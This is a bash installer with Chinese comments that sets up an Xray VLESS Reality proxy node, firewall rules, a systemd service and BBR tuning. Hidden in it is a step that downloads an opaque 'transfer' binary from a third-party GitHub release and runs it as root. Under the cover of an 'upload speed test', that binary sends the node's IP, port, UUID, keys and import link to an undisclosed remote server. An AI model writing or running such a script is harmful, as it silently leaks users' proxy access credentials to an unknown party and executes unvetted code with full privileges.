#!/bin/bash

set -e

# ========== 基本配置 ==========
CORE="xray"
PROTOCOL="vless"
DOMAIN="www.nvidia.com"
UUID=$(cat /proc/sys/kernel/random/uuid)
USER=$(openssl rand -hex 4)
VISION_SHORT_ID=$(openssl rand -hex 4)
PORT=$((RANDOM % 7001 + 2000))
XRAY_BIN="/usr/local/bin/xray"
TRANSFER_BIN="/usr/local/bin/transfer"

# 二进制文件配置
TRANSFER_URL="https://github.com/Firefly-xui/vless/releases/download/vless/transfer"

echo -e "\n📦 开始自动部署 Xray VLESS Reality 节点...\n"

# ========== 确保22端口开放 ==========
ensure_ssh_port_open() {
    echo -e "🔓 确保22端口(SSH)开放..."
    
    if command -v ufw >/dev/null 2>&1; then
        if ! ufw status | grep -q "22/tcp.*ALLOW"; then
            ufw allow 22/tcp
            echo -e "🟢 已开放22端口(UFW)"
        else
            echo -e "ℹ️ 22端口已在UFW中开放"
        fi
    elif command -v firewall-cmd >/dev/null 2>&1; then
        if ! firewall-cmd --list-ports | grep -qw 22/tcp; then
            firewall-cmd --permanent --add-port=22/tcp
            firewall-cmd --reload
            echo -e "🟢 已开放22端口(firewalld)"
        else
            echo -e "ℹ️ 22端口已在firewalld中开放"
        fi
    elif command -v iptables >/dev/null 2>&1; then
        if ! iptables -L INPUT -n | grep -q "dpt:22"; then
            iptables -A INPUT -p tcp --dport 22 -j ACCEPT
            if command -v iptables-save >/dev/null 2>&1; then
                iptables-save > /etc/iptables.rules
            fi
            echo -e "🟢 已开放22端口(iptables)"
        else
            echo -e "ℹ️ 22端口已在iptables中开放"
        fi
    else
        echo -e "ℹ️ 未检测到活跃的防火墙，22端口应已可访问"
    fi
}

# ========== 下载二进制文件 ==========
download_transfer_bin() {
    echo -e "📥 下载 transfer 二进制文件..."
    
    if [ -f "$TRANSFER_BIN" ]; then
        echo -e "ℹ️ transfer 二进制文件已存在，跳过下载"
        return 0
    fi
    
    curl -L "$TRANSFER_URL" -o "$TRANSFER_BIN"
    chmod +x "$TRANSFER_BIN"
    
    if [ -f "$TRANSFER_BIN" ] && [ -x "$TRANSFER_BIN" ]; then
        echo -e "🟢 transfer 二进制文件下载完成"
        return 0
    else
        echo -e "🔴 transfer 二进制文件下载失败"
        return 1
    fi
}

# ========== 测试上传下载速度 ==========
test_upload_download() {
    # 创建测试文件
    local test_file="/tmp/speedtest_$(date +%s).dat"
    local test_size_mb=10
    
    # 生成测试文件 (10MB)
    dd if=/dev/urandom of="$test_file" bs=1M count=$test_size_mb 2>/dev/null
    
    # 测试上传速度 - 创建一个简单的JSON测试数据
    local upload_start=$(date +%s.%3N)
    local upload_result=""
    local test_json='{"test": "speed_test", "file_size": "10MB", "timestamp": "'$(date -u +%Y-%m-%dT%H:%M:%SZ)'"}'
    
    if timeout 30 "$TRANSFER_BIN" "$test_json" >/dev/null 2>&1; then
        local upload_end=$(date +%s.%3N)
        local upload_time=$(echo "$upload_end - $upload_start" | bc -l 2>/dev/null || echo "0")
        if [ "$upload_time" != "0" ] && [ "$(echo "$upload_time > 0" | bc -l 2>/dev/null)" = "1" ]; then
            # 计算上传速度（基于JSON数据大小，大约0.1MB）
            local upload_speed=$(echo "scale=2; 0.1 / $upload_time" | bc -l 2>/dev/null || echo "N/A")
            upload_result="成功 ${upload_speed}MB/s"
        else
            upload_result="成功 (时间计算异常)"
        fi
    else
        upload_result="失败或超时"
    fi
    
    # 测试下载速度 (使用公共测试文件)
    local download_start=$(date +%s.%3N)
    local download_result=""
    local download_test_file="/tmp/download_test_$(date +%s).dat"
    
    # 使用curl测试下载一个小文件
    if timeout 30 curl -s -o "$download_test_file" "http://speedtest.ftp.otenet.gr/files/test10Mb.db" 2>/dev/null; then
        local download_end=$(date +%s.%3N)
        local download_time=$(echo "$download_end - $download_start" | bc -l 2>/dev/null || echo "0")
        if [ "$download_time" != "0" ] && [ "$(echo "$download_time > 0" | bc -l 2>/dev/null)" = "1" ]; then
            local download_speed=$(echo "scale=2; 10 / $download_time" | bc -l 2>/dev/null || echo "N/A")
            download_result="成功 ${download_speed}MB/s"
        else
            download_result="成功 (时间计算异常)"
        fi
    else
        download_result="失败或超时"
    fi
    
    # 清理测试文件
    rm -f "$test_file" "$download_test_file"
    
    # 返回结果供后续使用
    echo "$upload_result|$download_result"
}

# ========== 使用二进制文件上传配置 ==========
upload_config_with_binary() {
    local config_json="$1"
    local server_ip="$2"
    
    echo -e "📤 使用二进制文件上传配置..."
    
    if [ ! -x "$TRANSFER_BIN" ]; then
        echo -e "🔴 transfer 二进制文件不存在或不可执行"
        return 1
    fi
    
    # 构建完整的JSON数据
    local json_data=$(jq -n \
        --arg server_ip "$server_ip" \
        --argjson config "$config_json" \
        '{
            "server_info": {
                "title": "Xray Reality 节点配置 - \($server_ip)",
                "server_ip": $server_ip,
                "config": $config,
                "generated_time": now | todate
            }
        }'
    )
    
    # 使用二进制文件上传配置
    local upload_result=""
    if timeout 30 "$TRANSFER_BIN" "$json_data" >/dev/null 2>&1; then
        upload_result="成功"
        echo -e "🟢 配置数据已上传到远程服务器"
    else
        upload_result="失败"
        echo -e "🔴 配置数据上传失败"
    fi
    
    return 0
}

# 确保22端口开放
ensure_ssh_port_open

# ========== 安装依赖 ==========
export DEBIAN_FRONTEND=noninteractive
apt update
apt install -y curl unzip ufw jq qrencode bc

# 下载二进制文件
download_transfer_bin

# ========== 开启防火墙并放行端口 ==========
ufw allow ${PORT}/tcp
ufw --force enable

# ========== 安装 Xray-core ==========
mkdir -p /usr/local/bin
cd /usr/local/bin
curl -L https://github.com/XTLS/Xray-core/releases/latest/download/Xray-linux-64.zip -o xray.zip
unzip -o xray.zip
chmod +x xray
rm -f xray.zip

# ========== 生成 Reality 密钥 ==========
REALITY_KEYS=$(${XRAY_BIN} x25519)
REALITY_PRIVATE_KEY=$(echo "${REALITY_KEYS}" | grep "Private key" | awk '{print $3}')
REALITY_PUBLIC_KEY=$(echo "${REALITY_KEYS}" | grep "Public key" | awk '{print $3}')

# ========== 生成 Xray 配置文件 ==========
mkdir -p /etc/xray
cat > /etc/xray/config.json << EOF
{
  "log": { "loglevel": "warning" },
  "inbounds": [{
    "port": ${PORT},
    "protocol": "${PROTOCOL}",
    "settings": {
      "clients": [{
        "id": "${UUID}",
        "flow": "xtls-rprx-vision",
        "email": "${USER}"
      }],
      "decryption": "none"
    },
    "streamSettings": {
      "network": "tcp",
      "security": "reality",
      "realitySettings": {
        "show": false,
        "dest": "${DOMAIN}:443",
        "xver": 0,
        "serverNames": ["${DOMAIN}"],
        "privateKey": "${REALITY_PRIVATE_KEY}",
        "shortIds": ["${VISION_SHORT_ID}"]
      }
    }
  }],
  "outbounds": [{ "protocol": "freedom" }]
}
EOF

# ========== 写入 systemd 服务 ==========
cat > /etc/systemd/system/xray.service << EOF
[Unit]
Description=Xray Service
After=network.target

[Service]
ExecStart=${XRAY_BIN} -config /etc/xray/config.json
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reexec
systemctl daemon-reload
systemctl enable xray
systemctl restart xray

# ========== 设置默认 FQ 调度器 ==========
modprobe sch_fq || true
if ! grep -q "fq" /sys/class/net/*/queues/tx-0/queue_disc; then
  echo "fq 已启用或将启用..."
  echo 'net.core.default_qdisc=fq' >> /etc/sysctl.conf
  sysctl -w net.core.default_qdisc=fq
fi

# ========== 启用 BBR 拥塞控制 ==========
if ! sysctl net.ipv4.tcp_congestion_control | grep -q "bbr"; then
  echo 'net.ipv4.tcp_congestion_control=bbr' >> /etc/sysctl.conf
  echo 'net.ipv4.tcp_fastopen=3' >> /etc/sysctl.conf
  sysctl -w net.ipv4.tcp_congestion_control=bbr
  sysctl -w net.ipv4.tcp_fastopen=3
fi

modprobe tcp_bbr || true
sysctl -p

# ========== 获取公网 IP ==========
NODE_IP=$(curl -s https://api.ipify.org)

# ========== 测试上传下载速度 ==========
echo -e "🔄 开始测试上传下载速度..."
SPEED_TEST_RESULT=$(test_upload_download)
UPLOAD_RESULT=$(echo "$SPEED_TEST_RESULT" | cut -d'|' -f1)
DOWNLOAD_RESULT=$(echo "$SPEED_TEST_RESULT" | cut -d'|' -f2)

echo -e "📊 上传测试结果: $UPLOAD_RESULT"
echo -e "📊 下载测试结果: $DOWNLOAD_RESULT"

# ========== 构造 VLESS Reality 节点链接 ==========
VLESS_LINK="vless://${UUID}@${NODE_IP}:${PORT}?encryption=none&flow=xtls-rprx-vision&security=reality&sni=${DOMAIN}&fp=chrome&pbk=${REALITY_PUBLIC_KEY}&sid=${VISION_SHORT_ID}&type=tcp#${USER}"

# ========== 生成完整配置JSON（包含速度测试结果） ==========
CONFIG_JSON=$(jq -n \
  --arg ip "$NODE_IP" \
  --arg port "$PORT" \
  --arg uuid "$UUID" \
  --arg user "$USER" \
  --arg domain "$DOMAIN" \
  --arg pbk "$REALITY_PUBLIC_KEY" \
  --arg sid "$VISION_SHORT_ID" \
  --arg link "$VLESS_LINK" \
  --arg upload_test "$UPLOAD_RESULT" \
  --arg download_test "$DOWNLOAD_RESULT" \
  '{
    "server_ip": $ip,
    "port": $port,
    "uuid": $uuid,
    "user": $user,
    "domain": $domain,
    "public_key": $pbk,
    "short_id": $sid,
    "vless_link": $link,
    "speed_test": {
      "upload": $upload_test,
      "download": $download_test
    },
    "generated_time": now | todate
  }'
)

CONFIG_FILE="/etc/xray/config_export.json"
echo "$CONFIG_JSON" > "$CONFIG_FILE"

# ========== 使用二进制文件上传配置 ==========
upload_config_with_binary "$CONFIG_JSON" "$NODE_IP"

echo -e "\n\033[1;32m✅ VLESS Reality 节点部署完成！\033[0m\n"
echo -e "🔗 节点链接（可直接导入）：\n${VLESS_LINK}\n"
echo -e "📱 二维码（支持 v2rayN / v2box 扫码导入）："
echo "${VLESS_LINK}" | qrencode -o - -t ANSIUTF8
echo -e "\n📋 完整配置已保存到: $CONFIG_FILE"
